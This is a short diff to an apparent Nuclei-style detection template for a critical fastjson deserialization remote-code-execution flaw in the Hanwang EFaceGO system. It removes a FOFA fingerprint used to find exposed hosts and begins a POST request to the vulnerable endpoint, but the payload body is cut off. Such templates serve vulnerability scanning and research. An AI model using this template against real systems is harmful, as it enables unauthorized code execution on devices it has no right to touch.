@@ -3,12 +3,8 @@ info:
   name: 汉王EFaceGO addVisitDeviceAppointmentInfoTest fastjson反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/as1zilmsiavb76au'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: as1zilmsiavb76au
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
